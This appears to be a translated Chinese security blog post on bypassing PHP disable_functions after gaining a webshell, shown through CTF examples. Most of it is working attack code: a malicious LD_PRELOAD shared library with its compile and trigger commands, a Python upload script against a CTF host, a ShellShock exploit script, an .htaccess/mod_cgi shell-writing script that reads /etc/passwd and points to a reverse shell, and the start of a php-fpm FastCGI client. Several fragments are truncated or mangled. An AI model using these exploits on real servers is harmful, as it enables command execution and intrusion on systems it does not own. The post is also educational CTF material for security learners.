# bypass disable_function多种方法+实例
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
作者：ch3ng@星盟
## 前言
在做CTF题目或者是在渗透的过程中常常会遇到已经拿到了webshell但是却无法执行命令，主要原因是由于常用的函数例如：system()等被禁用
## LD_PRELOAD
LD_PRELOAD是linux下的一个环境变量，可以影响程序运行时的链接过程，被指定路径的文件会在其它文件被调用点，最先调用
一个测试mail.php
查看其运行时启动的子进程
    strace -f php mail.php 2>&1 | grep execve
    execve("/usr/bin/php", ["php", "mail.php"], 0x7ffdd5194ee0 /* 23 vars */) = 0
    [pid  9707] execve("/bin/sh", ["sh", "-c", "/usr/sbin/sendmail -t -i "], 0x5597ba716e70 /* 23 vars */) = 0
    [pid  9708] execve("/usr/sbin/sendmail", ["/usr/sbin/sendmail", "-t", "-i"], 0x5586f66f9bd0 /* 23 vars */) = 0
查看sendmail使用了哪些函数
    readelf -s /usr/sbin/sendmail
这里使用getuid，编写so文件test.c
    #include 
    #include 
    #include 
    void payload(){
            system("whoami > /tmp/Ch3ng");
    }
    int getuid()
    {
            if(getenv("LD_PRELOAD")==NULL){ return 0;}
            unsetenv("LD_PRELOAD");
            payload();
    }
编译生成
    gcc -c -fPIC test.c -o hack && gcc --share hack -o hack.so
接着php使用：
即可发现/tmp多了个Ch3ng文件
例题：  
题目源码：
查看phpinfo()，发现disable_function有很多禁用函数
    pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system
蚁剑连接上去，将bypass_disablefunc.php与bypass_disablefunc_x64.so上传上去，但是由于这里禁用了mail函数，所以这里使用error_log来触发
最后执行
    bypass_disablefunc.php?cmd=/readflag&outpath=/tmp/xx&sopath=/var/www/html/bypass_disablefunc_x64.so
即可获得flag
或者直接在利用php执行：
    file_put_contents('/tmp/1.so',pack('H*',''));putenv("EVIL_CMDLINE=/readflag > /tmp/flag.txt");putenv("LD_PRELOAD=/tmp/1.so");error_log("",1);readfile('/tmp/flag.txt');
或者利用python脚本上传执行：
    import requests
    url = "http://f7eb61fe-d260-451c-a9b2-37bd2cd37bcf.node3.buuoj.cn/?Ginkgo=ZXZhbCgkX1BPU1RbJ2EnXSk7"
    data = {
        "a":"move_uploaded_file($_FILES['file']['tmp_name'],'/tmp/1.so');putenv('EVIL_CMDLINE=/readflag > /tmp/flag.txt');putenv('LD_PRELOAD=/tmp/1.so');error_log('',1);readfile('/tmp/flag.txt');"
    }
    file = {'file':open('1.so','rb')}
    r = requests.post(url=url,files=file,data=data)
    print r.content
## ShellShock
利用bash破壳漏洞（CVE-2014-6271），该漏洞存在于bash 1.14 – 4.3版本中  
导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令  
利用的PHP代码：
    $tmp 2>&1"); 
       // In Safe Mode, the user may only alter environment variableswhose names 
       // begin with the prefixes supplied by this directive. 
       // By default, users will only be able to set environment variablesthat 
       // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, 
       // PHP will let the user modify ANY environment variable! 
       //mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actuallysend any mail 
       error_log('a',1);
       $output = @file_get_contents($tmp); 
       @unlink($tmp); 
       if($output != "") return $output; 
       else return "No output, or not vuln."; 
    } 
    echo shellshock($_REQUEST["cmd"]); 
    ?>
上传脚本运行得到flag
## Apache Mod CGI
禁用函数如下：
    pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv
比之前多禁用了putenv
这次使用的方法是利用.htaccess，我们通过上传.htaccess来利用apache的mod_cgi来绕过php的限制，这个利用方法在De1CTF
checkin出现过  
利用条件：
  * 目录下有写权限
  * apache 使用 apache_mod_php
  * Web 目录给了 AllowOverride 权限
  * 启用了mod_cgi
首先上传.htaccess
    Options +ExecCGI
    AddHandler cgi-script .test
之后上传shell.test
    #!/bin/bash
    echo&&cat /etc/passwd
然后访问shell.test
也可以直接上传，访问之后反弹shell
    n";
    }
    if (!isset($_GET['checked']))
    {
        @file_put_contents('.htaccess', "nSetEnv HTACCESS on", FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed
        header('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true'); //execute the script again to see if the htaccess test worked
    }
    else
    {
        $modcgi = in_array('mod_cgi', apache_get_modules()); // mod_cgi enabled?
        $writable = is_writable('.'); //current dir writable?
        $htaccess = !empty($_SERVER['HTACCESS']); //htaccess enabled?
            checkEnabled("Mod-Cgi enabled",$modcgi,"Yes","No");
            checkEnabled("Is writable",$writable,"Yes","No");
            checkEnabled("htaccess working",$htaccess,"Yes","No");
        if(!($modcgi && $writable && $htaccess))
        {
            echo "Error. All of the above must be true for the script to work!"; //abort if not
        }
        else
        {
            checkEnabled("Backing up .htaccess",copy(".htaccess",".htaccess.bak"),"Suceeded! Saved in .htaccess.bak","Failed!"); //make a backup, cause you never know.
            checkEnabled("Write .htaccess file",file_put_contents('.htaccess',"Options +ExecCGInAddHandler cgi-script .dizzle"),"Succeeded!","Failed!"); //.dizzle is a nice extension
            checkEnabled("Write shell file",file_put_contents('shell.dizzle',$shellfile),"Succeeded!","Failed!"); //write the file
            checkEnabled("Chmod 777",chmod("shell.dizzle",0777),"Succeeded!","Failed!"); //rwx
            echo "Executing the script now. Check your listener "; //call the script
        }
    }
    ?>
## PHP-FPM
php-fpm是PHP内置的一种fast-cgi
> php-fpm即php-Fastcgi Process Manager.  
>  php-fpm是 FastCGI 的实现，并提供了进程管理的功能。  
>  进程包含 master 进程和 worker 进程两种进程。  
>  master 进程只有一个，负责监听端口，接收来自 Web Server 的请求，而 worker 进程则一般有多个(具体数量根据实际需要配置)，  
>  每个进程内部都嵌入了一个 PHP 解释器，是 PHP 代码真正执行的地方。
与php-fpm通信有两种模式，一种为TCP，一种为Unix Socket，这里以TCP为例，构造fastcgi协议与fpm通信，
开启PHP_ADMIN_VALUE来加载恶意的.so
     * @version     1.0
     */
    class FCGIClient
    {
        const VERSION_1            = 1;
        const BEGIN_REQUEST        = 1;
        const ABORT_REQUEST        = 2;
        const END_REQUEST          = 3;
        const PARAMS               = 4;
        const STDIN                = 5;
        const STDOUT               = 6;
        const STDERR               = 7;
        const DATA                 = 8;
        const GET_VALUES           = 9;
        const GET_VALUES_RESULT    = 10;
        const UNKNOWN_TYPE         = 11;
        const MAXTYPE              = self::UNKNOWN_TYPE;
        const RESPONDER            = 1;
        const AUTHORIZER           = 2;
        const FILTER               = 3;
        const REQUEST_COMPLETE     = 0;
        const CANT_MPX_CONN        = 1;
        const OVERLOADED           = 2;
        const UNKNOWN_ROLE         = 3;
        const MAX_CONNS            = 'MAX_CONNS';
        const MAX_REQS             = 'MAX_REQS';
        const MPXS_CONNS           = 'MPXS_CONNS';
        const HEADER_LEN           = 8;
        /**
         * Socket
         * @var Resource
         */
        private $_sock = null;
        /**
         * Host
         * @var String